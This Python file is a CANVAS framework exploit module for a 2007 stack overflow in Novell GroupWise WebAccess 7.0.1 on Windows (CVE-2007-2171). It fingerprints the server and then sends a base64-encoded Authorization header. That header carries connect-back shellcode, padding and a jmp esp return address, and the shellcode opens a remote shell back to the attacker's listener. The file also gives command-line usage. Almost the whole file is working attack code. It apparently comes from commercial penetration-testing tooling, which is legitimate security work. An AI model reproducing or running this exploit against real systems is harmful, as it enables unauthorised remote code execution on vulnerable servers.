#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='Novell GroupWise WebAccess Base64 Overflow'
DESCRIPTION='Novell GroupWise WebAccess Base64 Decoding Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Novell"
DOCUMENTATION['Date public']='04/18/07'
DOCUMENTATION['References']='http://www.zerodayinitiative.com/advisories/ZDI-07-015.html'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2007-2171'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2171'
DOCUMENTATION['CVSS'] = 10.0

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','2003']

NAME=DESCRIPTION

NOTES="""
Tested on:
Novell GroupWise WebAccess 7.0.1 on Windows 2000 Server SP4 English

Usage:
./commandlineInterface.py -v 1 -p 5555
./exploits/groupwise_webaccess/groupwise_webaccess.py -v 0 -t 10.10.11.136 -l 10.10.11.1 -d 5555
"""

CHANGELOG="""
"""

import base64
from MOSDEF import mosdef
import canvasengine

targets = {
    0: ['Autodetect',0],
    1: ['Novell GroupWise WebAccess 7.0.1 on Windows',0x1006a65b], #jmp esp
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=7205
        self.ssl=0
        self.badstring='\0'
        self.subesp=1000
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        self.shellcode=self.createSmallWin32Shellcode(self.callback.ip,self.callback.port,self.subesp)
        return self.shellcode

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.ssl=self.argsDict.get('ssl',self.ssl)
        return 
    
    def test(self):
        self.getArgs()
        url='/'
        while True:
            s=self.gettcpsock()
            try:
                s.connect((self.host, self.port))
            except:
                self.log('Could not connect to port %s with ssl=%s'%(self.port,self.ssl))
                return 0
            request=''
            request+='GET '+url+' HTTP/1.1\r\n'
            request+='Host: %s:%d\r\n'%(self.host,self.port)
            request+='\r\n'
            self.websend(s,request)
            data=self.webrecv(s)
            s.close()
            if data.count('302 Moved')>0:
                index=data.find('"')
                url=data[index+1:]
                index=url.find('"')
                url=url[:index]
                #print url
            else:
                break
        #Server: GroupWise-WebAccess-Agent/7.0.1-For-WindowsNT
        if data.count('GroupWise-WebAccess-Agent/7.0.1-For-WindowsNT')>0:
            self.version=1
            return 1
        return 0
    
    def run(self):
        self.getArgs()

        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        if self.version==0:
            self.test()
            if self.version==0:
                self.log('Autoversioning not available')
                return 0
        self.info,self.eip=targets[self.version]
        if len(self.shellcode)>0x14c:
            raise Exception,'Shellcode too big!'
        data=''
        data+=self.shellcode
        data+='A'*(0x14c-len(data))
        data+=struct.pack('<L',self.eip)
        data+='B'*8
        data+=mosdef.assemble('jmp $-%d'%(len(data)+5),'x86')
        request=''
        request+='GET / HTTP/1.1\r\n'
        request+='Host: %s:%d\r\n'%(self.host,self.port)
        request+='Authorization: basic '+base64.b64encode(data)+'\r\n'
        request+='\r\n'

        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s:%s'%(self.host,self.port))
            return 0
        self.log('Connected to target')
        self.websend(s,request)
        time.sleep(4)
        if self.ISucceeded():
            return 1
        s.close()

        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def usage(self):
        print 'Usage: %s -v version [ -O ssl:1 ] -t host -p port -l localip -d localport\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
